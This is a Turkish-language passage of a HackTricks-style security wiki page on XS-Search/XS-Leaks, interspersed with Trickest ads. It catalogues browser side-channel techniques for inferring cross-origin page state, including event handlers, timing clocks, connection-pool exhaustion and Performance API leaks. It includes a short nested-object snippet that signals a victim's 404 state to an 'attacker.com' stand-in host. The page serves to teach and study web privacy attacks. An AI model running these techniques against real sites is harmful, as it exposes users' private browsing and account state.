# XS-Search/XS-Leaks

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

XS-Search, **yan kanal zafiyetlerini** kullanarak **çapraz kaynak bilgilerini** **çıkarmak** için kullanılan bir yöntemdir.

Bu saldırıda yer alan ana bileşenler şunlardır:

- **Zayıf Web**: Bilgilerin çıkarılmasının hedeflendiği web sitesi.
- **Saldırganın Webi**: Saldırgan tarafından oluşturulan, kurbanın ziyaret ettiği ve istismarı barındıran kötü niyetli web sitesi.
- **Dahil Etme Yöntemi**: Zayıf Web'i Saldırganın Web'ine dahil etmek için kullanılan teknik (örneğin, window.open, iframe, fetch, href ile HTML etiketi vb.).
- **Sızıntı Tekniği**: Dahil etme yöntemi aracılığıyla toplanan bilgilere dayanarak Zayıf Web'in durumundaki farklılıkları ayırt etmek için kullanılan teknikler.
- **Durumlar**: Saldırganın ayırt etmeyi hedeflediği Zayıf Web'in iki potansiyel durumu.
- **Tespit Edilebilir Farklılıklar**: Saldırganın Zayıf Web'in durumunu çıkarmak için güvendiği gözlemlenebilir varyasyonlar.

### Tespit Edilebilir Farklılıklar

Zayıf Web'in durumlarını ayırt etmek için analiz edilebilecek birkaç yön vardır:

- **Durum Kodu**: **Çeşitli HTTP yanıt durum kodları** arasında ayırt etme, sunucu hataları, istemci hataları veya kimlik doğrulama hataları gibi.
- **API Kullanımı**: Sayfalar arasında **Web API'lerinin** kullanımını belirleme, çapraz kaynak bir sayfanın belirli bir JavaScript Web API'sini kullanıp kullanmadığını ortaya çıkarma.
- **Yönlendirmeler**: Farklı sayfalara yapılan navigasyonları tespit etme, sadece HTTP yönlendirmeleri değil, aynı zamanda JavaScript veya HTML tarafından tetiklenenleri de.
- **Sayfa İçeriği**: **HTTP yanıt gövdesindeki** veya sayfa alt kaynaklarındaki varyasyonları gözlemleme, örneğin **gömülü çerçeve sayısı** veya resimlerdeki boyut farklılıkları.
- **HTTP Başlığı**: **Belirli bir HTTP yanıt başlığının** varlığını veya muhtemel değerini not etme, X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi başlıklar dahil.
- **Zamanlama**: İki durum arasındaki tutarlı zaman farklılıklarını fark etme.

### Dahil Etme Yöntemleri

- **HTML Elemanları**: HTML, **çapraz kaynak dahil etme** için çeşitli elemanlar sunar, stil sayfaları, resimler veya betikler gibi, tarayıcının HTML dışı bir kaynağı talep etmesini zorunlu kılar. Bu amaçla potansiyel HTML elemanlarının bir derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
- **Çerçeveler**: **iframe**, **object** ve **embed** gibi elemanlar, HTML kaynaklarını doğrudan saldırganın sayfasına gömebilir. Sayfa **çerçeve koruması** yoksa, JavaScript, içerikWindow özelliği aracılığıyla çerçevelenmiş kaynağın pencere nesnesine erişebilir.
- **Açılır Pencereler**: **`window.open`** yöntemi, bir kaynağı yeni bir sekmede veya pencerede açar, JavaScript'in yöntemlerle ve özelliklerle etkileşimde bulunması için bir **pencere tutamacı** sağlar. Açılır pencereler, genellikle tek oturum açma işlemlerinde kullanılır, hedef kaynağın çerçeveleme ve çerez kısıtlamalarını aşar. Ancak, modern tarayıcılar açılır pencere oluşturmayı belirli kullanıcı eylemleriyle sınırlamaktadır.
- **JavaScript İstekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doğrudan istekler yapmaya izin verir. Bu yöntemler, isteği takip etme gibi isteğin üzerinde hassas kontrol sağlar.

### Sızıntı Teknikleri

- **Olay İşleyici**: XS-Leaks'teki klasik bir sızıntı tekniği, **onload** ve **onerror** gibi olay işleyicilerin kaynak yükleme başarısı veya başarısızlığı hakkında bilgi sağlamasıdır.
- **Hata Mesajları**: JavaScript istisnaları veya özel hata sayfaları, ya doğrudan hata mesajından ya da varlığı ve yokluğu arasındaki farkı ayırt ederek sızıntı bilgisi sağlayabilir.
- **Küresel Sınırlar**: Bir tarayıcının fiziksel sınırlamaları, bellek kapasitesi veya diğer zorunlu tarayıcı sınırları gibi, bir eşik aşıldığında sinyal verebilir ve sızıntı tekniği olarak hizmet edebilir.
- **Küresel Durum**: Tarayıcıların **küresel durumları** (örneğin, Geçmiş arayüzü) ile tespit edilebilir etkileşimler istismar edilebilir. Örneğin, bir tarayıcının geçmişindeki **giriş sayısı**, çapraz kaynak sayfalar hakkında ipuçları verebilir.
- **Performans API'si**: Bu API, **mevcut sayfanın performans detaylarını** sağlar, belgeler ve yüklenen kaynaklar için ağ zamanlaması dahil, talep edilen kaynaklar hakkında çıkarımlar yapılmasına olanak tanır.
- **Okunabilir Nitelikler**: Bazı HTML nitelikleri **çapraz kaynak olarak okunabilir** ve sızıntı tekniği olarak kullanılabilir. Örneğin, `window.frame.length` özelliği, JavaScript'in bir web sayfasında çapraz kaynak olarak dahil edilen çerçeveleri saymasına olanak tanır.

## XSinator Aracı ve Makalesi

XSinator, **bilinen birkaç XS-Leaks** için tarayıcıları **kontrol eden** otomatik bir araçtır ve makalesinde açıklanmıştır: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Araca **şu adresten erişebilirsiniz**: [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Hariç Tutulan XS-Leaks**: XSinator'daki diğer sızıntılarla çelişeceği için **hizmet çalışanlarına** dayanan XS-Leaks'leri hariç tutmak zorunda kaldık. Ayrıca, belirli bir web uygulamasındaki yanlış yapılandırma ve hatalara dayanan XS-Leaks'leri de **hariç tutmayı** seçtik. Örneğin, CrossOrigin Resource Sharing (CORS) yanlış yapılandırmaları, postMessage sızıntısı veya Cross-Site Scripting. Ayrıca, genellikle yavaş, gürültülü ve hatalı oldukları için zaman tabanlı XS-Leaks'leri de hariç tuttuk.

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Zaman Tabanlı Teknikler**

Aşağıdaki tekniklerden bazıları, web sayfalarının olası durumlarındaki farklılıkları tespit etmek için zaman kullanacak. Bir web tarayıcısında zamanı ölçmenin farklı yolları vardır.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API'si, geliştiricilerin yüksek çözünürlüklü zaman ölçümleri almasına olanak tanır.\
Saldırganların istismar edebileceği önemli sayıda API vardır: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonları ve diğerleri.\
Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay İşleyici Teknikleri

### Onload/Onerror

- **Dahil Etme Yöntemleri**: Çerçeveler, HTML Elemanları
- **Tespit Edilebilir Farklılık**: Durum Kodu
- **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Özet**: Bir kaynağı yüklemeye çalışırken, onerror/onload olayları, kaynağın başarıyla/başarısız bir şekilde yüklendiğinde tetiklenir, durum kodunu anlamak mümkündür.
- **Kod örneği**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
xs-search/cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Kod örneği, **JS'den betik nesnelerini yüklemeye** çalışır, ancak **diğer etiketler** (nesneler, stil sayfaları, resimler, sesler gibi) de kullanılabilir. Ayrıca, **etiketi doğrudan** enjekte etmek ve `onload` ve `onerror` olaylarını etiketin içinde tanımlamak da mümkündür (JS'den enjekte etmek yerine).

Bu saldırının bir de betiksiz versiyonu vardır:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda eğer `example.com/404` bulunamazsa `attacker.com/?error` yüklenecektir.

### Onload Zamanlaması

- **Dahil Etme Yöntemleri**: HTML Elemanları
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Özet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API'si**, bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Ancak, 50ms'den fazla süren görevleri tanımlayabilen [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) başka bir örnek:

{{#ref}}
xs-search/performance.now-example.md
{{#endref}}

#### Onload Zamanlaması + Zorunlu Ağır Görev

Bu teknik, bir öncekiyle aynıdır, ancak **saldırgan** ayrıca **cevap olumlu veya olumsuz olduğunda** **ilgili bir süre** alacak bir eylemi **zorlayacaktır** ve o süreyi ölçer.

{{#ref}}
xs-search/performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Zamanlaması

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Özet:** [SharedArrayBuffer saati](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers), bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynağı almak için geçen süre, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) olaylarını kullanarak ölçülebilir. **`beforeunload`** olayı, tarayıcının yeni bir sayfaya geçiş yapmadan önce tetiklenirken, **`unload`** olayı geçişin gerçekten gerçekleştiği zaman meydana gelir. Bu iki olay arasındaki zaman farkı, **tarayıcının kaynağı almak için harcadığı süreyi** belirlemek için hesaplanabilir.

### Sandboxed Çerçeve Zamanlaması + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Özet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API'si, bir isteği gerçekleştirmek için ne kadar zaman gerektiğini ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) yokluğunda, bir sayfanın ve alt kaynaklarının ağ üzerinden yüklenmesi için gereken zamanın bir saldırgan tarafından ölçülebileceği gözlemlenmiştir. Bu ölçüm genellikle mümkündür çünkü bir iframe'in `onload` işleyicisi, yalnızca kaynak yüklemesi ve JavaScript yürütmesi tamamlandıktan sonra tetiklenir. Script yürütmesinin getirdiği değişkenliği aşmak için, bir saldırgan `<iframe>` içinde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) niteliğini kullanabilir. Bu niteliğin dahil edilmesi, özellikle JavaScript'in yürütülmesi gibi birçok işlevselliği kısıtlar ve böylece ağırlıklı olarak ağ performansından etkilenen bir ölçüm yapılmasını kolaylaştırır.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**:
- **Summary**: Eğer doğru içeriğe erişildiğinde sayfa hata verip, herhangi bir içerik erişildiğinde doğru bir şekilde yükleniyorsa, o zaman tüm bilgileri zaman ölçmeden çıkarmak için bir döngü oluşturabilirsiniz.
- **Code Example**:

Farz edelim ki **iframe** içinde **gizli** içeriği olan **sayfayı** **ekleyebilirsiniz**.

**Kurbanın** "_**flag**_" içeren dosyayı bir **Iframe** kullanarak aramasını sağlayabilirsiniz (örneğin bir CSRF istismar ederek). Iframe içinde _**onload olayı**_ her zaman en az bir kez **çalıştırılacaktır**. Sonra, **iframe**'in **URL**'sini değiştirerek sadece **hash** içeriğini değiştirebilirsiniz.

Örneğin:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Eğer ilk URL **başarıyla yüklendiyse**, o zaman **URL**'nin **hash** kısmını **değiştirirken** **onload** olayı **tekrar tetiklenmeyecek**. Ama **eğer** sayfa **yüklenirken** bir tür **hata** almışsa, o zaman **onload** olayı **tekrar tetiklenecektir**.

Sonra, erişildiğinde **doğru** yüklenmiş bir sayfa ile **hata** olan bir sayfa arasında **ayrım** yapabilirsiniz.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**:
- **Summary:** Eğer **sayfa** **hassas** içeriği **dönüyorsa**, **veya** kullanıcı tarafından **kontrol edilebilen** bir **içerik** dönüyorsa. Kullanıcı **geçersiz durumda** **geçerli JS kodu** ayarlayabilir, her denemeyi **`<script>`** etiketleri içinde **yükleyebilir**, böylece **geçersiz** durumlarda saldırganların **kodu** **çalıştırılır**, ve **doğru** durumlarda **hiçbir şey** çalıştırılmaz.
- **Code Example:**

{{#ref}}
xs-search/javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Durum Kodu & Başlıklar
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)**, web sayfalarının belirli hassas çapraz kaynaklı kaynakları yüklemesini engelleyen bir güvenlik önlemidir. Ancak, saldırganlar bu koruyucu davranışı istismar edebilir. **CORB**'ye tabi bir yanıt, `nosniff` ile birlikte _**CORB korumalı**_ `Content-Type` ve `2xx` durum kodu döndüğünde, **CORB** yanıtın gövdesini ve başlıklarını temizler. Bunu gözlemleyen saldırganlar, **durum kodu** (başarı veya hata gösteren) ve `Content-Type` (koruma altında olup olmadığını belirten) kombinasyonunu çıkarabilir, bu da potansiyel bilgi sızıntısına yol açar.
- **Code Example**:

Daha fazla bilgi için daha fazla bilgi bağlantısını kontrol edin.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: ID veya ad niteliğinden hassas verileri sızdırın.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir **iframe** içinde bir **sayfayı** **yüklemek** ve sayfanın **belirtilen** öğeye **odaklanmasını** sağlamak için **`#id_value`** kullanmak mümkündür, ardından bir **`onblur`** sinyali tetiklendiğinde, ID öğesi vardır.\
Aynı saldırıyı **`portal`** etiketleri ile de gerçekleştirebilirsiniz.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Kullanımı
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: Bir postMessage'dan hassas bilgileri toplayın veya postMessages'ın varlığını kullanarak kullanıcının sayfadaki durumunu bilmek için bir oracle olarak kullanın.
- **Code Example**: `Tüm postMessages'ı dinleyen herhangi bir kod.`

Uygulamalar genellikle [`postMessage` yayınlarını](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) farklı kökenler arasında iletişim kurmak için kullanır. Ancak, `targetOrigin` parametresi düzgün bir şekilde belirtilmezse, bu yöntem istemeden **hassas bilgileri** açığa çıkarabilir, bu da herhangi bir pencerenin mesajları almasına izin verir. Ayrıca, bir mesajı almanın kendisi bir **oracle** olarak işlev görebilir; örneğin, belirli mesajlar yalnızca oturum açmış kullanıcılara gönderilebilir. Bu nedenle, bu mesajların varlığı veya yokluğu, kullanıcının durumu veya kimliği hakkında bilgi verebilir, örneğin, oturum açıp açmadıkları gibi.

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Kullanımı
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: WebSocket bağlantı limitini aşmak, bir çapraz kaynak sayfasının WebSocket bağlantı sayısını sızdırır.
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Bir hedef sayfanın **kaç tane WebSocket bağlantısı kullandığını** belirlemek mümkündür. Bu, bir saldırgana uygulama durumlarını tespit etme ve WebSocket bağlantı sayısına bağlı bilgileri sızdırma imkanı tanır.

Eğer bir **kaynak** maksimum sayıda WebSocket bağlantı nesnesi kullanıyorsa, bağlantı durumlarından bağımsız olarak, **yeni nesnelerin oluşturulması JavaScript istisnalarına yol açacaktır**. Bu saldırıyı gerçekleştirmek için, saldırgan web sitesi hedef web sitesini bir pop-up veya iframe içinde açar ve ardından hedef web yüklendikten sonra mümkün olan maksimum sayıda WebSocket bağlantısı oluşturmaya çalışır. **Atılan istisnaların sayısı**, hedef web sitesinin kullandığı **WebSocket bağlantı sayısıdır**.

### Payment API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Kullanımı
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Sadece birinin aynı anda aktif olabileceğini tespit edin.
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-Sızıntı, bir saldırgana **bir çapraz kaynak sayfasının bir ödeme talebi başlattığını tespit etme** imkanı tanır.

Çünkü **aynı anda yalnızca bir ödeme talebi aktif olabilir**, eğer hedef web sitesi Payment Request API'sini kullanıyorsa, bu API'yi kullanma girişimleri **başarısız olacak** ve bir **JavaScript istisnası** oluşturacaktır. Saldırgan, **periyodik olarak Ödeme API'si UI'sını göstermeye çalışarak** bunu istismar edebilir. Eğer bir deneme bir istisna oluşturursa, hedef web sitesi şu anda bunu kullanıyor demektir. Saldırgan, UI oluşturulduktan hemen sonra kapatarak bu periyodik denemeleri gizleyebilir.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** Tek iş parçacıklı JS olay döngüsünü kötüye kullanarak bir webin yürütme süresini ölçün.
- **Code Example**:

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript, [tek iş parçacıklı bir olay döngüsü](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eşzamanlılık modelinde çalışır, bu da **sadece bir görevi aynı anda gerçekleştirebileceği** anlamına gelir. Bu özellik, **farklı bir kökenden gelen kodun yürütülmesi için ne kadar zaman gerektiğini ölçmek** için istismar edilebilir. Bir saldırgan, sabit özelliklere sahip olayları sürekli olarak göndererek kendi kodunun yürütme süresini olay döngüsünde ölçebilir. Bu olaylar, olay havuzu boş olduğunda işlenecektir. Eğer diğer kökenler de aynı havuza olay gönderiyorsa, bir **saldırgan, kendi görevlerinin yürütülmesindeki gecikmeleri gözlemleyerek bu dış olayların yürütülmesi için geçen süreyi çıkarabilir**. Gecikmeleri izleme yöntemi, farklı kökenlerden gelen kodun yürütme süresini açığa çıkarabilir ve potansiyel olarak hassas bilgileri sızdırabilir.

> [!WARNING]
> Bir yürütme zamanlamasında, **daha hassas ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfanın kullandığı kaynakları yükleyerek.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** Bir web işleminin yürütme süresini ölçmenin bir yöntemi, bir iş parçacığının olay döngüsünü kasıtlı olarak engellemek ve ardından **olay döngüsünün tekrar ne kadar sürede kullanılabilir hale geldiğini** zamanlamaktır. Olay döngüsüne bir engelleyici işlem (uzun bir hesaplama veya senkron API çağrısı gibi) ekleyerek ve sonraki kodun yürütülmeye başlaması için geçen süreyi izleyerek, engelleme süresi boyunca olay döngüsünde yürütülen görevlerin süresini çıkarabilirsiniz. Bu teknik, JavaScript'in olay döngüsünün tek iş parçacıklı doğasını kullanır; burada görevler sıralı olarak yürütülür ve aynı iş parçacığını paylaşan diğer işlemlerin performansı veya davranışı hakkında içgörüler sağlayabilir.
- **Code Example**:

Olay döngüsünü kilitleyerek yürütme süresini ölçme tekniğinin önemli bir avantajı, **Site İzolasyonu**'nu aşma potansiyelidir. **Site İzolasyonu**, farklı web sitelerini ayrı süreçlere ayıran bir güvenlik özelliğidir ve kötü niyetli sitelerin diğer sitelerden hassas verilere doğrudan erişimini engellemeyi amaçlar. Ancak, bir saldırgan, paylaşılan olay döngüsü aracılığıyla başka bir kökenin yürütme zamanlamasını etkileyerek, o kökenin faaliyetleri hakkında dolaylı olarak bilgi çıkarabilir. Bu yöntem, diğer kökenin verilerine doğrudan erişim gerektirmez, bunun yerine o kökenin faaliyetlerinin paylaşılan olay döngüsü üzerindeki etkisini gözlemler, böylece **Site İzolasyonu** tarafından oluşturulan koruyucu engellerden kaçınır.

> [!WARNING]
> Bir yürütme zamanlamasında, **daha hassas ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfanın kullandığı kaynakları yükleyerek.

### Connection Pool

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** Bir saldırgan, 1 hariç tüm soketleri kilitleyebilir, hedef webi yükleyebilir ve aynı anda başka bir sayfayı yükleyebilir, son sayfanın yüklenmeye başlaması için geçen süre, hedef sayfanın yüklenmesi için geçen süredir.
- **Code Example**:

{{#ref}}
xs-search/connection-pool-example.md
{{#endref}}

Tarayıcılar, sunucu iletişimi için soketler kullanır, ancak işletim sistemi ve donanımın sınırlı kaynakları nedeniyle, **tarayıcılar eşzamanlı soket sayısına bir sınır koymak zorundadır**. Saldırganlar, bu sınırlamayı aşağıdaki adımlarla istismar edebilir:

1. Tarayıcının soket limitini belirleyin, örneğin, 256 global soket.
2. 255 soketi uzun bir süre boyunca, bağlantıları tamamlamadan açık tutacak şekilde, çeşitli ana bilgisayarlara 255 istek başlatarak doldurun.
3. Hedef sayfaya bir istek göndermek için 256. soketi kullanın.
4. Farklı bir ana bilgisayara 257. isteği deneyin. Tüm soketler kullanıldığından (2. ve 3. adımlara göre), bu istek, bir soket mevcut olana kadar bekleyecektir. Bu isteğin ilerlemesi için geçen süre, saldırgana 256. soketle (hedef sayfanın soketi) ilgili ağ etkinliği hakkında zamanlama bilgisi sağlar. Bu çıkarım mümkündür çünkü 2. adımda 255 soket hala meşguldür, bu da yeni mevcut olan soketin 3. adımda serbest bırakılan soket olması gerektiğini gösterir. 256. soketin mevcut hale gelmesi için geçen süre, dolayısıyla hedef sayfaya yapılan isteğin tamamlanması için gereken süreyle doğrudan bağlantılıdır.

Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**:
- **Summary:** Önceki teknikle aynı ama tüm soketleri kullanmak yerine, Google **Chrome** aynı kökene **6 eşzamanlı isteğe** bir sınır koyar. Eğer **5'ini engellersek** ve sonra **6. bir isteği başlatırsak**, bunu **zamanlayabiliriz** ve eğer **kurban sayfasının** aynı uç noktaya daha fazla **istek göndermesini** sağlarsak, **6. istek** **daha uzun** sürecek ve bunu tespit edebiliriz.

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) web uygulamalarının performans metrikleri hakkında içgörüler sunar ve [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API) ile daha da zenginleştirilmiştir. Resource Timing API, isteklerin süresi gibi ayrıntılı ağ isteği zamanlamalarını izlemeyi sağlar. Özellikle, sunucular yanıtlarında `Timing-Allow-Origin: *` başlığını içerdiğinde, transfer boyutu ve alan adı arama süresi gibi ek veriler kullanılabilir hale gelir.

Bu veri zenginliği, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yöntemler aracılığıyla elde edilebilir ve performansla ilgili bilgilerin kapsamlı bir görünümünü sağlar. Ayrıca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgaları arasındaki farkı hesaplayarak yürütme sürelerini ölçmeyi kolaylaştırır. Ancak, Chrome gibi bazı tarayıcılarda `performance.now()`'un hassasiyetinin milisaniyelerle sınırlı olabileceği ve bu durumun zamanlama ölçümlerinin ayrıntılığını etkileyebileceği unutulmamalıdır.

Zamanlama ölçümlerinin ötesinde, Performance API güvenlikle ilgili içgörüler için de kullanılabilir. Örneğin, Chrome'daki `performance` nesnesinde sayfaların varlığı veya yokluğu, `X-Frame-Options` uygulandığını gösterebilir. Özellikle, bir sayfa `X-Frame-Options` nedeniyle bir çerçevede render edilmekten engellenirse, `performance` nesnesinde kaydedilmeyecektir, bu da sayfanın çerçeveleme politikaları hakkında ince bir ipucu sağlar.

### Error Leak

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Durum Kodu
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Hatalara neden olan bir istek, bir kaynak zamanlama girişi oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

HTTP yanıt durum kodları arasında **ayrım yapmak** mümkündür çünkü bir **hata** ile sonuçlanan istekler **performans girişi** oluşturmaz.

### Style Reload Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Durum Kodu
